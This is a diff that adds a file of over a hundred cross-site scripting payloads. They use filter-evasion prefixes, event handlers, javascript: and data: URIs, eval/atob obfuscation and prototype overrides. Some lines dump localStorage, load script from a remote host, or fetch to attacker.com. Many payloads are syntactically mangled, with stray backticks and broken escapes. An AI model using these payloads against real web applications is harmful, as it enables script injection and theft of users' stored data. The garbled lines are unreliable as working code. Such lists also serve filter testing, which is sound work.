@@ -1,0 +1,107 @@
+<<h1>script/>alert`xss`
+<<h1>script/>alert`xss`//
+<<h1>script/>alert(JSON.stringify(localStorage))
+<<h1>script/>confirm`xss`
+<<h1>script/>confirm`xss`//
+<<h1>script/>confirm(JSON.stringify(localStorage))
+<<h1>script/>alert`xss`
+<<div>script/>alert`xss`
+<<span>script/>alert`xss``
+<<p>script/>alert`xss``
+<<img>script/>alert`xss``
+<<script>script/>alert`xss``
+<<SCRIPT>script/>alert`xss``
+<<h1>script//>alert`xss``
+<<h1>script/>alert`xss`//<script>alert(`xss`)</script>
+<<h1>script/>alert`xss`//`
+<<h1>script/>alert`xss`<!--`
+<<h1>script/>alert`xss`/*`
+<<h1>script//alert`xss``
+<<h1>script/>console.log\\xss``
+<<h1>script/>fetch('/?q=${alert`xss`}')`
+<<h1>script/>new Image().src=\\javascript:alert`xss```
+<<h1>script/>document.write\\xss``
+<<h1>script/>window.alert`xss``
+<<h1>script/>eval(\\alert`xss`)``
+<<h1>script/>self.alert`xss``
+<<h1>img src=x onerror=alert`xss`>`
+<<h1>svg/onload=alert`xss`>`
+<<h1>iframe/srcdoc="<script>alert`xss`</script>">`
+<<h1>math><mi><script>alert`xss`</script></mi></math>`
+<<h1>body onload=alert`xss``
+<<h1>video src=x onerror=alert`xss`>`
+<<h1>audio src=x onerror=alert`xss`>`
+<<h1>object data=javascript:alert`xss`>`
+<<h1>embed src="javascript:alert`xss`">`
+<<h1>link rel="stylesheet" href="javascript:alert`xss`">`
+<<h1>style>@import 'javascript:alert`xss`';`
+<<h1>meta http-equiv="refresh" content="0;url=javascript:alert`xss`">`
+<<h1>svg><script>alert`xss`</script></svg>`
+<<h1>math>svg><script>alert`xss`</script></svg></math>`
+<<h1>object type="text/javascript">alert`xss`</object>`
+<<h1>script src=data:text/javascript,alert`xss`></script>`
+<<h1>script src=//example.com/x.js></script>
+<<h1>script>setTimeout(() => alert`xss`, 0)</script>`
+<<h1>script>setInterval(() => alert`xss`, 1000)</script>`
+<<h1>scr<script>ipt>alert`xss`</scr</script>ipt>`
+<<h1>scr<script>ipt>alert`xss`//</scr</script>ipt>`
+<<h1>div><svg onload=alert`xss`></svg></div>`
+<<h1>ul><li><script>alert`xss`</script></li></ul>`
+<<h1>table><tr><td><script>alert`xss`</script></td></tr></table>`
+<<h1>svg><foreignObject><script>alert`xss`</script></foreignObject></svg>`
+<<h1>details open><summary>Click</summary><script>alert`xss`</script></details>`
+<<h1>marquee><script>alert`xss`</script></marquee>`
+<<h1>blink><script>alert`xss`</script></blink>`
+<<h1>plaintext>alert`xss`</plaintext>`
+<<h1>xmp><script>alert`xss`</script></xmp>`
+<<h1>iframe srcdoc="<svg/onload=alert`xss`>"></iframe>`
+<<h1>script>document.cookie=alert`xss`</script>`
+<<h1>script>console.error(\\xss`)</script>`
+<<h1>script>throw \\xss`</script>`
+<<h1>script>location.href=\\javascript:alert`xss``</script>`
+<<h1>script>document.location=\\javascript:alert`xss``</script>`
+<<h1>svg><animate onbegin=alert`xss`></animate></svg>`
+<<h1>math><svg><animate onbegin=alert`xss`></animate></svg></math>`
+<<h1>svg><script x="alert`xss`"></script></svg>`
+<<h1>iframe src="data:text/html,<script>alert`xss`</script>">`
+<<h1>object data="data:text/html,<script>alert`xss`</script>"`
+<<h1>embed src="data:text/html,<script>alert`xss`</script>"`
+<<h1>script src="data:application/javascript,alert`xss`"></script>`
+<<h1>script>fetch(\\//attacker.com/?c=${alert`xss`}`)</script>`
+<<h1>script>new XMLHttpRequest().open('GET', \\?q=${alert`xss`}`, true)</script>`
+<<h1>script>window.onerror = () => alert`xss`</script>`
+<<h1>script>document.body.innerHTML = \\<h2>XSS!</h2>`</script>`
+<<h1>script>document.body.appendChild(document.createTextNode(\\xss`))</script>`
+<<h1>script>var s=document.createElement('script');s.innerHTML=\\alert`xss``;document.body.appendChild(s)</script>`
+<<h1>script>setAttribute('onerror', \\alert`xss`)</script>`
+<<h1>script>document.write('<img src=x onerror=alert`xss`>')</script>`
+<<h1>script>history.pushState({}, '', \\?q=${alert`xss`}`)</script>`
+<<h1>script>document.location.hash = \\xss=${alert`xss`}`</script>`
+<<h1>script>navigator.sendBeacon('/log', \\xss=${alert`xss`}`)</script>`
+<<h1>script>window.open(\\javascript:alert`xss``)</script>`
+<<h1>script>document.head.innerHTML += '<style>body{background:url(javascript:alert\\\\xss`)}'</style>'</script>`
+<<h1>script>Object.defineProperty(window, 'x', {get:()=>alert`xss`});x</script>`
+<<h1>script>>><!--<script>alert`xss`</script></script>`
+<<h1>script>document.write('<svg><script>alert`xss`</script></svg>')</script>`
+<<h1>script>eval(atob('YWxlcnReeHNz'))</script>
+<<h1>script>new Function(\\alert`xss``)()</script>`
+<<h1>img src=x onerror=eval(\\alert`xss``)>`
+<<h1>svg><g onmouseover=alert`xss`>hover me</g></svg>`
+<<h1>svg><text onfocus=alert`xss` tabindex=0>focus me</text></svg>`
+<<h1>body onscroll=alert`xss``
+<<h1>body onmousemove=alert`xss``
+<<h1>object type="image/svg+xml" data="data:image/svg+xml,<svg onload=alert`xss`>">`
+<<h1>script>XMLHttpRequest.prototype.send = () => alert`xss`;</script>`
+<<h1>script>fetch = () => alert`xss`;</script>`
+<<h1>script>alert`xss`;throw `xss`</script>`
+<<h1>script>Object.prototype.valueOf = () => alert`xss`;</script>`
+<<h1>script>document.addEventListener('click', () => alert`xss`)</script>`
+<<h1>script>setImmediate(() => alert`xss`)</script>`
+<<h1>script>Promise.resolve().then(() => alert`xss`)</script>`
+<<h1>script>Object.freeze = () => alert`xss`;</script>`
+<<h1>script>this['constructor']['constructor'](\\alert`xss`)`()</script>`
+<<h1>script>document.documentElement.innerHTML += \\<script>alert`xss`</script>`</script>`
+<<h1>script>document.body.setAttribute('onload', \\alert`xss`)</script>`
+<<h1>script>document.body.dataset.x = alert`xss`</script>`
+<<h1>script>history.replaceState({}, '', \\#${alert`xss`}`)</script>`
+<<h1>script>window.onerror = () => { alert`xss` }; void nonexistentFunction();</script>`
